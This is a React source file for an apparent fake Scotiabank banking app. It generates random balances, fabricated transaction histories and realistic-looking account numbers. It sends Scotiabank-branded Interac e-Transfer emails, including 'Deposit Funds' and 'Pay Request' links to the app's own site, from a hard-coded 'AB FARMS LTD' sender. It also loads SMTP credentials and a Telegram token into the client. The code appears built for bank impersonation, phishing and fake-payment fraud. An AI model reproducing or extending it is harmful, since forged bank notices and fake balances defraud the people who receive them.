import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
import { ScotiaAccountMap, ScotiaTransaction, PendingTransfer, ScotiaAccount, User, GlobalSettings } from './types';
import { sendEmail } from './services/emailRelay';
import { generateRandomTransactions } from './utils/randomData';

interface BankContextType {
  user: User | null;
  globalSettings: GlobalSettings | null;
  isLoading: boolean;
  error: string | null;
  isAdminPanelVisible: boolean;
  theme: 'light' | 'dark';
  toggleAdminPanel: () => void;
  toggleTheme: () => void;
  fetchGlobalSettings: () => Promise<void>;
  login: (username: string, password: string) => Promise<boolean>;
  logout: () => void;
  updateUser: (data: Partial<User>) => Promise<void>;
  updateAccount: (accountName: string, data: Partial<ScotiaAccount>) => Promise<void>;
  updateAccountBalance: (accountName: string) => Promise<void>;
  refreshAccountHistory: (accountName: string) => Promise<void>;
  performTransfer: (fromAccount: string, toAccount: string, amount: number, description: string) => Promise<void>;
  addTransaction: (accountName: string, transaction: ScotiaTransaction) => Promise<void>;
  cancelTransfer: (transferId: string) => Promise<void>;
  resendTransfer: (transferId: string) => Promise<void>;
  depositTransfer: (transferId: string, accountName: string) => Promise<void>;
  performETransfer: (fromAccount: string, recipientName: string, recipientEmail: string, amount: number, description: string) => Promise<PendingTransfer | undefined>;
  requestETransfer: (toAccount: string, recipientName: string, recipientEmail: string, amount: number, description: string) => Promise<void>;
  signup: (username: string, securityWord: string, password: string) => Promise<boolean>;
}

const BankContext = createContext<BankContextType | undefined>(undefined);

export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<User | null>(null);
  const [globalSettings, setGlobalSettings] = useState<GlobalSettings | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isAdminPanelVisible, setIsAdminPanelVisible] = useState(false);
  const [theme, setTheme] = useState<'light' | 'dark'>('light');

  const fetchGlobalSettings = useCallback(async (retries = 3) => {
    try {
      const res = await fetch('/api/admin/global-settings');
      if (res.ok) {
        const data: GlobalSettings = await res.json();
        setGlobalSettings(data);
        
        setUser((prevUser: User | null) => {
          if (!prevUser) return null;
          const updatedSettings = {
            ...prevUser.settings,
            overdraftLimit: data.general?.overdraftLimit || 500,
            transferLimit: data.general?.transferLimit || 3000,
            dailyLimit: data.general?.dailyLimit || 3000,
            maintenanceMode: data.general?.maintenanceMode || false,
            phpmailerSenderName: prevUser.settings.phpmailerSenderName || data.smtp?.senderName || 'AB FARMS LTD',
            smtpHost: data.smtp?.host,
            smtpPort: data.smtp?.port?.toString(),
            smtpUser: data.smtp?.user,
            smtpPass: data.smtp?.pass,
            telegramToken: data.telegram?.token,
          };
          return { ...prevUser, settings: updatedSettings };
        });
      } else {
        throw new Error(`Server returned ${res.status}`);
      }
    } catch (error) {
      console.error('Failed to fetch global settings:', error);
      if (retries > 0) {
        console.log(`Retrying... (${retries} retries left)`);
        setTimeout(() => fetchGlobalSettings(retries - 1), 1000);
      }
    }
  }, []);

  useEffect(() => {
    // Auto-detect system theme
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
    setTheme(mediaQuery.matches ? 'dark' : 'light');

    const handler = (e: MediaQueryListEvent) => setTheme(e.matches ? 'dark' : 'light');
    mediaQuery.addEventListener('change', handler);

    // Fetch global settings on mount
    fetchGlobalSettings();

    return () => mediaQuery.removeEventListener('change', handler);
  }, [fetchGlobalSettings]);

  const toggleTheme = useCallback(() => {
    setTheme(prev => prev === 'light' ? 'dark' : 'light');
  }, []);

  const handleError = useCallback((msg: string, err: unknown) => {
    console.error(msg, err);
    setError(msg);
  }, []);

  const toggleAdminPanel = useCallback(() => {
    setIsAdminPanelVisible(prev => !prev);
  }, []);

  const generateRefNumber = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const calculateBalance = (history: ScotiaTransaction[]) => {
    return Math.round(history.reduce((sum, tx) => sum + tx.amount, 0) * 100) / 100;
  };

  const generateAllRandomHistory = useCallback(async (currentUser: User) => {
    const updatedAccounts = { ...currentUser.accounts };
    Object.keys(updatedAccounts).forEach(accountName => {
        if (!updatedAccounts[accountName].history || updatedAccounts[accountName].history.length === 0) {
          const targetBalance = updatedAccounts[accountName].balance;
          const randomHistory = generateRandomTransactions(15, targetBalance);
          updatedAccounts[accountName] = {
            ...updatedAccounts[accountName],
            history: randomHistory,
            balance: calculateBalance(randomHistory),
            onHold: 0
          };
        }
    });
    return updatedAccounts;
  }, []);

  const login = useCallback(async (username: string, password: string) => {
    try {
        setIsLoading(true);
        setError(null);
        
        const response = await fetch('/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });

        const text = await response.text();
        let data;
        try {
          data = JSON.parse(text);
        } catch (e) {
          console.error('Failed to parse login response:', text);
          throw new Error("Invalid response from server");
        }

        if (data.success && data.user) {
          const defaultAccounts: ScotiaAccountMap = {
            'Ultimate Package': { type: 'banking', balance: 15000 + Math.random() * 5000, available: 15000 + Math.random() * 5000, points: 1250, history: [] },
            'Momentum Plus Savings': { type: 'banking', balance: 20000 + Math.random() * 10000, available: 20000 + Math.random() * 10000, points: 0, history: [] },
            'SCENE Visa Card': { type: 'credit', balance: -1250.40, available: 3749.60, points: 5420, history: [] },
            'Tax-Free Savings Account': { type: 'banking', balance: 5500.00, available: 5500.00, points: 0, history: [] },
            'Line of Credit': { type: 'credit', balance: -500.00, available: 9500.00, points: 0, history: [] }
          };

          const generateAcc = () => `${Math.floor(Math.random() * 90000) + 10000}-${Math.floor(Math.random() * 900) + 100}-${Math.floor(Math.random() * 9000000) + 1000000}`;

          // Assign realistic-looking account numbers to the default accounts
          defaultAccounts['Ultimate Package'].accountNumber = generateAcc();
          defaultAccounts['Momentum Plus Savings'].accountNumber = generateAcc();
          defaultAccounts['SCENE Visa Card'].accountNumber = `4532-XXXX-XXXX-${Math.floor(Math.random() * 9000) + 1000}`;
          defaultAccounts['Tax-Free Savings Account'].accountNumber = generateAcc();
          defaultAccounts['Line of Credit'].accountNumber = generateAcc();

          const userWithBalances = { 
            ...data.user,
            username: username,
            securityWord: data.user.securityWord || 'SARAH',
            isApproved: data.user.isApproved !== undefined ? data.user.isApproved : true, // Default to true for existing users
            accounts: data.user.accounts || defaultAccounts,
            scenePoints: data.user.scenePoints ?? 1000000,
            purchasedCards: data.user.purchasedCards || [],
            settings: { 
              accountHolderName: data.user.settings?.accountHolderName || 'AB FARMS LTD',
              phpmailerSenderName: data.user.settings?.phpmailerSenderName || 'AB FARMS LTD',
              ...data.user.settings, 
              overdraftLimit: data.user.settings?.overdraftLimit || 500,
              transferLimit: data.user.settings?.transferLimit || 3000,
              dailyLimit: data.user.settings?.dailyLimit || 3000,
            },
            contacts: data.user.contacts || [
              { id: '1', name: 'Michael Chen', email: 'm.chen@gmail.com', securityQuestion: 'What was my first car?', securityAnswer: 'Honda', autodeposit: false },
              { id: '2', name: 'Sarah Thompson', email: 'sarah.t@outlook.com', securityQuestion: 'What is my dog\'s name?', securityAnswer: 'Luna', autodeposit: false },
              { id: '3', name: 'David Wilson', email: 'd.wilson@shaw.ca', securityQuestion: 'What city was I born in?', securityAnswer: 'Calgary', autodeposit: false },
              { id: '4', name: 'Emily Rodriguez', email: 'emily.rod@icloud.com', securityQuestion: 'What is my favorite food?', securityAnswer: 'Tacos', autodeposit: false },
              { id: '5', name: 'James MacDonald', email: 'j.macdonald@telus.net', securityQuestion: 'What high school did I go to?', securityAnswer: 'Central', autodeposit: false },
              { id: '6', name: 'Jessica Wong', email: 'jess.wong@rogers.com', securityQuestion: 'What is my mother\'s maiden name?', securityAnswer: 'Lee', autodeposit: true },
              { id: '7', name: 'Robert Smith', email: 'rob.smith@bell.net', securityQuestion: 'What is my favorite sport?', securityAnswer: 'Hockey', autodeposit: false },
              { id: '8', name: 'Ashley Leblanc', email: 'ashley.leblanc@videotron.ca', securityQuestion: 'What was my first pet?', securityAnswer: 'Goldie', autodeposit: false },
              { id: '9', name: 'Christopher Brown', email: 'c.brown@uwaterloo.ca', securityQuestion: 'What is my favorite movie?', securityAnswer: 'Inception', autodeposit: true },
              { id: '10', name: 'Amanda Singh', email: 'amanda.singh@td.com', securityQuestion: 'What is my dream vacation?', securityAnswer: 'Japan', autodeposit: false },
              { id: '11', name: 'Matthew Gauthier', email: 'm.gauthier@umontreal.ca', securityQuestion: 'What instrument do I play?', securityAnswer: 'Guitar', autodeposit: false },
              { id: '12', name: 'Jennifer Taylor', email: 'j.taylor@gov.bc.ca', securityQuestion: 'What is my favorite book?', securityAnswer: '1984', autodeposit: true },
              { id: '13', name: 'Daniel O\'Brien', email: 'd.obrien@scotiabank.com', securityQuestion: 'What is my middle name?', securityAnswer: 'Patrick', autodeposit: false },
              { id: '14', name: 'Nicole Martin', email: 'n.martin@rbc.com', securityQuestion: 'What is my favorite season?', securityAnswer: 'Autumn', autodeposit: false },
              { id: '15', name: 'Kevin Nguyen', email: 'k.nguyen@shopify.com', securityQuestion: 'What is my favorite hobby?', securityAnswer: 'Coding', autodeposit: true },
              { id: '16', name: 'Linda Tremblay', email: 'l.tremblay@videotron.ca', securityQuestion: 'What is my mother\'s maiden name?', securityAnswer: 'Roy', autodeposit: false },
              { id: '17', name: 'William Wright', email: 'w.wright@telus.net', securityQuestion: 'What was my first pet?', securityAnswer: 'Buster', autodeposit: false },
              { id: '18', name: 'Fatima Al-Sayed', email: 'fatima.s@gmail.com', securityQuestion: 'What city was I born in?', securityAnswer: 'Toronto', autodeposit: true },
              { id: '19', name: 'Arjun Kapoor', email: 'kapoor.a@rogers.com', securityQuestion: 'What was my first car?', securityAnswer: 'Toyota', autodeposit: false },
              { id: '20', name: 'Isabella Rossi', email: 'i.rossi@icloud.com', securityQuestion: 'What is my favorite food?', securityAnswer: 'Pasta', autodeposit: false },
              { id: '21', name: 'Marcus Johnson', email: 'm.johnson@bell.net', securityQuestion: 'What high school did I go to?', securityAnswer: 'North', autodeposit: false },
              { id: '22', name: 'Sophie Dubois', email: 'sophie.d@shaw.ca', securityQuestion: 'What is my favorite movie?', securityAnswer: 'Amélie', autodeposit: true },
              { id: '23', name: 'Liam O\'Connor', email: 'liam.oc@outlook.com', securityQuestion: 'What is my dream vacation?', securityAnswer: 'Ireland', autodeposit: false },
              { id: '24', name: 'Olivia Zhang', email: 'o.zhang@uwaterloo.ca', securityQuestion: 'What was my first pet?', securityAnswer: 'Mochi', autodeposit: true },
              { id: '25', name: 'Noah Smith', email: 'n.smith@gov.bc.ca', securityQuestion: 'What city was I born in?', securityAnswer: 'Victoria', autodeposit: false }
            ]
          };

          // Try to fetch global settings to override defaults
          try {
            const settingsRes = await fetch('/api/admin/global-settings');
            if (settingsRes.ok) {
              const settingsData = await settingsRes.json();
              userWithBalances.settings = {
                ...userWithBalances.settings,
                overdraftLimit: settingsData.general?.overdraftLimit || userWithBalances.settings.overdraftLimit,
                transferLimit: settingsData.general?.transferLimit || userWithBalances.settings.transferLimit,
                dailyLimit: settingsData.general?.dailyLimit || userWithBalances.settings.dailyLimit,
                phpmailerSenderName: userWithBalances.settings.phpmailerSenderName || settingsData.smtp?.senderName || 'AB FARMS LTD',
                accountHolderName: userWithBalances.settings.accountHolderName || 'AB FARMS LTD',
              };
            }
          } catch (error) {
            console.warn("Could not fetch global settings during login", error);
          }

          const accountsWithRandomHistory = await generateAllRandomHistory(userWithBalances);
          userWithBalances.accounts = accountsWithRandomHistory;
          setUser(userWithBalances);
          
          // Auto-open Admin Panel if logging in as admin
          if (username === 'admin' || username === 'PROJECTSARAH') {
            setIsAdminPanelVisible(true);
          }
          
          setIsLoading(false);
          return true;
        } else {
          throw new Error(data.message || "Login failed");
        }
    } catch (err) {
        handleError("Login failed", err);
        setIsLoading(false);
        return false;
    }
  }, [handleError, generateAllRandomHistory]);

  const logout = useCallback(() => {
    setUser(null);
  }, []);

  const updateUser = useCallback(async (data: Partial<User>) => {
    if (!user) return;
    const updatedUser = { ...user, ...data };
    setUser(updatedUser);

    try {
      const response = await fetch('/api/user/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user.username, data })
      });
      if (!response.ok) throw new Error("Failed to sync user data to server");
    } catch (err) {
      console.error("Failed to sync user data to server", err);
      throw err;
    }
  }, [user]);

  const updateAccount = useCallback(async (accountName: string, data: Partial<ScotiaAccount>) => {
    try {
        if (!user) throw new Error("User not logged in");
        const updatedAccounts = { ...user.accounts };
        if (updatedAccounts[accountName]) {
          updatedAccounts[accountName] = { ...updatedAccounts[accountName], ...data };
          await updateUser({ accounts: updatedAccounts });
        }
    } catch (err) {
        handleError("Account update failed", err);
    }
  }, [user, updateUser]);

  const performTransfer = useCallback(async (fromAccount: string, toAccount: string, amount: number, description: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        
        const updatedAccounts = { ...user.accounts };
        if (!updatedAccounts[fromAccount]) throw new Error("Account not found");

        /*
        const availableBalance = updatedAccounts[fromAccount].available ?? updatedAccounts[fromAccount].balance;
        if (availableBalance - amount < 10000) {
          throw new Error(`Insufficient funds. Minimum balance of $10,000.00 required.`);
        }
        */

        const transaction: ScotiaTransaction = {
          id: Date.now().toString(),
          date: new Date().toISOString(),
          description,
          amount: -amount,
          status: 'Completed',
          category: 'Transfer'
        };

        updatedAccounts[fromAccount] = {
          ...updatedAccounts[fromAccount],
          history: [transaction, ...updatedAccounts[fromAccount].history],
          balance: updatedAccounts[fromAccount].balance - amount,
          available: (updatedAccounts[fromAccount].available ?? updatedAccounts[fromAccount].balance) - amount
        };

        if (updatedAccounts[toAccount]) {
          const toTransaction: ScotiaTransaction = {
            ...transaction,
            amount: amount,
            description: `Transfer from ${fromAccount}`
          };
          updatedAccounts[toAccount] = {
            ...updatedAccounts[toAccount],
            history: [toTransaction, ...updatedAccounts[toAccount].history],
            balance: updatedAccounts[toAccount].balance + amount,
            available: (updatedAccounts[toAccount].available ?? updatedAccounts[toAccount].balance) + amount
          };
        }

        await updateUser({ accounts: updatedAccounts });
    } catch (err) {
        handleError("Transfer failed", err);
    }
  }, [user, updateUser]);

  const addTransaction = async (accountName: string, transaction: ScotiaTransaction) => {
    try {
        if (!user || !user.accounts[accountName]) throw new Error("Account not found");
        
        const updatedAccounts = { ...user.accounts };
        updatedAccounts[accountName] = {
          ...updatedAccounts[accountName],
          history: [transaction, ...updatedAccounts[accountName].history],
          balance: updatedAccounts[accountName].balance + transaction.amount,
          available: (updatedAccounts[accountName].available ?? updatedAccounts[accountName].balance) + transaction.amount
        };

        await updateUser({ accounts: updatedAccounts });
    } catch (err) {
        handleError("Transaction addition failed", err);
    }
  };

  const updateAccountBalance = async (accountName: string) => {
    if (!user) return;
    const updatedAccounts = { ...user.accounts };
    if (updatedAccounts[accountName]) {
      const newBalance = calculateBalance(updatedAccounts[accountName].history);
      const newAvailable = newBalance - (updatedAccounts[accountName].onHold || 0);
      updatedAccounts[accountName] = { ...updatedAccounts[accountName], balance: newBalance, available: newAvailable };
      await updateUser({ accounts: updatedAccounts });
    }
  };

  const refreshAccountHistory = async (accountName: string) => {
    if (!user) return;
    const updatedAccounts = { ...user.accounts };
    if (updatedAccounts[accountName]) {
      const targetBalance = updatedAccounts[accountName].balance;
      const randomHistory = generateRandomTransactions(15, targetBalance);
      updatedAccounts[accountName] = { 
        ...updatedAccounts[accountName], 
        history: randomHistory,
        balance: calculateBalance(randomHistory)
      };
      await updateUser({ accounts: updatedAccounts });
    }
  };

  const cancelTransfer = async (transferId: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        const pendingTransfers = user.pendingTransfers || [];
        const transfer = pendingTransfers.find(t => t.id === transferId);
        if (!transfer) throw new Error("Transfer not found");

        const updatedPending = pendingTransfers.filter(t => t.id !== transferId);
        const updatedAccounts = { ...user.accounts };

        if (transfer.fromAccountName && updatedAccounts[transfer.fromAccountName]) {
          // Update original pending transaction status
          updatedAccounts[transfer.fromAccountName].history = updatedAccounts[transfer.fromAccountName].history.map((tx: ScotiaTransaction) => 
            tx.id === transferId ? { ...tx, status: 'Cancelled' } : tx
          );

          const refundTransaction: ScotiaTransaction = {
            id: generateRefNumber(),
            date: new Date().toISOString(),
            description: `Interac e-Transfer Cancelled - Refund from ${transfer.recipientName}`,
            amount: transfer.amount,
            status: 'Refunded',
            category: 'Deposit'
          };

          updatedAccounts[transfer.fromAccountName] = {
            ...updatedAccounts[transfer.fromAccountName],
            history: [refundTransaction, ...updatedAccounts[transfer.fromAccountName].history],
            balance: updatedAccounts[transfer.fromAccountName].balance + transfer.amount,
            available: (updatedAccounts[transfer.fromAccountName].available ?? updatedAccounts[transfer.fromAccountName].balance) + transfer.amount
          };
        }

        await updateUser({ 
          pendingTransfers: updatedPending,
          accounts: updatedAccounts
        });

        // Send cancellation email to recipient
        const todayObj = new Date();
        const dateStr = todayObj.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        
        await sendEmail({
          recipient_email: transfer.recipientEmail,
          recipient_name: transfer.recipientName,
          amount: transfer.amount,
          purpose: 'Interac e-Transfer Cancelled',
          template: 'cancelled.html',
          sender_name: user.settings.phpmailerSenderName || 'AB FARMS LTD',
          reference_number: transfer.id,
          date: dateStr,
          bank_name: 'Scotiabank',
          greeting: `Hi ${transfer.recipientName},`,
          headline: `Interac e-Transfer Cancelled`,
          app_url: window.location.origin,
          security_warning_text: 'This transfer has been cancelled by the sender and is no longer available for deposit.',
          action: 'View Status',
          deposit_payload: {
            amount: transfer.amount.toFixed(2),
            senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
            recipientName: transfer.recipientName,
            recipientEmail: transfer.recipientEmail,
            transaction_id: transfer.id,
            purpose: 'Interac e-Transfer Cancelled',
            status: 'cancelled'
          }
        }, '/api/mailer');
    } catch (err) {
        handleError("Cancellation failed", err);
    }
  };

  const depositTransfer = async (transferId: string, accountName: string) => {
    try {
        if (!user || !user.accounts[accountName]) throw new Error("Account not found");
        const pendingTransfers = user.pendingTransfers || [];
        const transfer = pendingTransfers.find(t => t.id === transferId);
        if (!transfer) throw new Error("Transfer not found");

        const updatedPending = pendingTransfers.filter(t => t.id !== transferId);
        const updatedAccounts = { ...user.accounts };

        const depositTransaction: ScotiaTransaction = {
          id: generateRefNumber(),
          date: new Date().toISOString(),
          description: `Interac e-Transfer Deposit from ${user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD'}`,
          amount: transfer.amount,
          status: 'Completed',
          category: 'Deposit'
        };

        updatedAccounts[accountName] = {
          ...updatedAccounts[accountName],
          history: [depositTransaction, ...updatedAccounts[accountName].history],
          balance: updatedAccounts[accountName].balance + transfer.amount,
          available: (updatedAccounts[accountName].available ?? updatedAccounts[accountName].balance) + transfer.amount
        };

        await updateUser({ 
          pendingTransfers: updatedPending,
          accounts: updatedAccounts
        });
    } catch (err) {
        handleError("Deposit failed", err);
    }
  };

  const performETransfer = async (fromAccount: string, recipientName: string, recipientEmail: string, amount: number, description: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        if (user.isApproved === false) {
          throw new Error("Your account is pending approval. You cannot send e-Transfers yet.");
        }
        if (user.isLocked) {
          throw new Error("Your account has been locked due to suspected security issues. Please contact support.");
        }
        
        const updatedAccounts = { ...user.accounts };
        if (!updatedAccounts[fromAccount]) throw new Error("Account not found");

        /*
        const availableBalance = updatedAccounts[fromAccount].available ?? updatedAccounts[fromAccount].balance;
        if (availableBalance - amount < 10000) {
          throw new Error(`Insufficient funds. Minimum balance of $10,000.00 required.`);
        }
        */

        // Check transfer limit
        const transferLimit = user.settings.transferLimit || 3000;
        if (amount > transferLimit) {
          throw new Error(`This transfer exceeds your single transaction limit of $${transferLimit.toLocaleString()}.`);
        }

        // Check daily limit
        const dailyLimit = user.settings.dailyLimit || 3000;
        const todayStr = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const sentToday = (user.pendingTransfers || [])
          .filter((t: PendingTransfer) => t.date === todayStr && t.status !== 'Cancelled')
          .reduce((sum: number, t: PendingTransfer) => sum + t.amount, 0);
        
        if (sentToday + amount > dailyLimit) {
          throw new Error(`This transfer exceeds your daily e-Transfer limit of $${dailyLimit.toLocaleString()}. You have already sent $${sentToday.toLocaleString()} today.`);
        }

        const refNumber = generateRefNumber();
        const transaction: ScotiaTransaction = {
          id: refNumber,
          date: new Date().toISOString(),
          description: description || `Interac e-Transfer to ${recipientName}`,
          amount: -amount,
          status: 'Sent',
          category: 'Transfer'
        };

        updatedAccounts[fromAccount] = {
          ...updatedAccounts[fromAccount],
          history: [transaction, ...updatedAccounts[fromAccount].history],
          balance: updatedAccounts[fromAccount].balance - amount,
          available: (updatedAccounts[fromAccount].available ?? updatedAccounts[fromAccount].balance) - amount
        };

        const newPending: PendingTransfer = {
          id: refNumber,
          recipientName,
          recipientEmail,
          amount,
          date: new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' }),
          status: 'Sent',
          fromAccountName: fromAccount
        };

        await updateUser({ 
          accounts: updatedAccounts,
          pendingTransfers: [...(user.pendingTransfers || []), newPending]
        });

        const todayObj = new Date();
        const expiryDate = new Date(todayObj);
        expiryDate.setDate(todayObj.getDate() + 30);
        const dateStr = todayObj.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const expiryStr = expiryDate.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });

        const mailerUrl = '/api/mailer';
        
        await sendEmail({
          recipient_email: recipientEmail,
          recipient_name: recipientName,
          amount: amount,
          purpose: description || 'Interac e-Transfer',
          template: 'sending.html',
          sender_name: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
          reference_number: refNumber,
          date: dateStr,
          expiry_date: expiryStr,
          bank_name: globalSettings?.general?.bank_name || 'Scotiabank',
          greeting: `Hi ${recipientName},`,
          headline: `${user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD'} sent you an Interac e-Transfer.`,
          app_url: window.location.origin,
          security_warning_text: `Keep your passwords and security answers private. ${globalSettings?.general?.bank_name || 'Scotiabank'} will never ask for them by email or text.`,
          action: 'Deposit Funds',
          deposit_payload: {
            amount: amount.toFixed(2),
            senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
            recipientName: recipientName,
            recipientEmail: recipientEmail,
            transaction_id: refNumber,
            purpose: description || 'Interac e-Transfer',
            status: 'pending'
          }
        }, mailerUrl);
        
        return newPending;
    } catch (err) {
        handleError("E-Transfer failed", err);
    }
  };

  const resendTransfer = async (transferId: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        const pendingTransfers = user.pendingTransfers || [];
        const transfer = pendingTransfers.find(t => t.id === transferId);
        if (!transfer) throw new Error("Transfer not found");

        const todayObj = new Date();
        const expiryDate = new Date(todayObj);
        expiryDate.setDate(todayObj.getDate() + 30);
        const dateStr = todayObj.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const expiryStr = expiryDate.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });

        const refNumber = generateRefNumber();
        const mailerUrl = '/api/mailer';
        
        await sendEmail({
          recipient_email: transfer.recipientEmail,
          recipient_name: transfer.recipientName,
          amount: transfer.amount,
          purpose: 'Interac e-Transfer Resend',
          template: 'resend.html',
          sender_name: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
          reference_number: refNumber,
          date: dateStr,
          expiry_date: expiryStr,
          bank_name: globalSettings?.general?.bank_name || 'Scotiabank',
          greeting: `Hi ${transfer.recipientName},`,
          headline: `Reminder: ${user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD'} sent you an Interac e-Transfer.`,
          app_url: window.location.origin,
          security_warning_text: `Keep your passwords and security answers private. ${globalSettings?.general?.bank_name || 'Scotiabank'} will never ask for them by email or text.`,
          action: 'Deposit Funds',
          deposit_payload: {
            amount: transfer.amount.toFixed(2),
            senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
            recipientName: transfer.recipientName,
            recipientEmail: transfer.recipientEmail,
            transaction_id: refNumber,
            purpose: 'Interac e-Transfer Resend',
            status: 'pending'
          }
        }, mailerUrl);
    } catch (err) {
        handleError("Resend failed", err);
    }
  };

  const requestETransfer = async (toAccount: string, recipientName: string, recipientEmail: string, amount: number, description: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        
        const refNumber = generateRefNumber();
        const todayObj = new Date();
        const expiryDate = new Date(todayObj);
        expiryDate.setDate(todayObj.getDate() + 30);
        const dateStr = todayObj.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const expiryStr = expiryDate.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const mailerUrl = '/api/mailer';

        await sendEmail({
          recipient_email: recipientEmail,
          recipient_name: recipientName,
          amount: amount,
          purpose: description || 'Interac e-Transfer Request',
          template: 'request.html',
          sender_name: user.settings.phpmailerSenderName || 'AB FARMS LTD',
          reference_number: refNumber,
          date: dateStr,
          expiry_date: expiryStr,
          bank_name: globalSettings?.general?.bank_name || 'Scotiabank',
          greeting: `Hi ${recipientName},`,
          headline: `${user.settings.phpmailerSenderName || 'AB FARMS LTD'} is requesting an Interac e-Transfer from you.`,
          app_url: window.location.origin,
          security_warning_text: `Keep your passwords and security answers private. ${globalSettings?.general?.bank_name || 'Scotiabank'} will never ask for them by email or text.`,
          action: 'Pay Request',
          deposit_payload: {
            amount: amount.toFixed(2),
            senderName: user.settings.phpmailerSenderName || 'AB FARMS LTD',
            recipientName: recipientName,
            recipientEmail: recipientEmail,
            transaction_id: refNumber,
            purpose: description || 'Interac e-Transfer Request',
            type: 'request',
            status: 'pending'
          }
        }, mailerUrl);
    } catch (err) {
        handleError("Request failed", err);
    }
  };

  const signup = useCallback(async (username: string, securityWord: string, password: string) => {
    try {
      setIsLoading(true);
      setError(null);

      const defaultAccounts: ScotiaAccountMap = {
        'Ultimate Package': { type: 'banking', balance: 0, available: 0, points: 0, history: [], accountNumber: `10000-000-0000001` },
      };

      const newUser: Partial<User> = {
        username,
        securityWord,
        accounts: defaultAccounts,
        contacts: [],
        scenePoints: 0,
        purchasedCards: [],
        isApproved: false,
        settings: {
          accountHolderName: username.split('@')[0],
          phpmailerSenderName: username.split('@')[0],
          memberSince: new Date().getFullYear().toString()
        }
      };

      const response = await fetch('/api/user/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username, 
          password,
          data: newUser,
          isNew: true 
        })
      });

      if (response.ok) {
        setIsLoading(false);
        return true;
      } else {
        const text = await response.text();
        throw new Error(text || "Signup failed");
      }
    } catch (err) {
      handleError("Signup failed", err);
      setIsLoading(false);
      return false;
    }
  }, [handleError]);

  return (
    <BankContext.Provider value={{ user, globalSettings, isLoading, error, isAdminPanelVisible, theme, toggleAdminPanel, toggleTheme, fetchGlobalSettings, login, logout, updateUser, updateAccount, updateAccountBalance, refreshAccountHistory, performTransfer, addTransaction, cancelTransfer, resendTransfer, depositTransfer, performETransfer, requestETransfer, signup }}>
      {children}
    </BankContext.Provider>
  );
};

export const useBank = () => {
  const context = useContext(BankContext);
  if (context === undefined) {
    throw new Error('useBank must be used within a BankProvider');
  }
  return context;
};
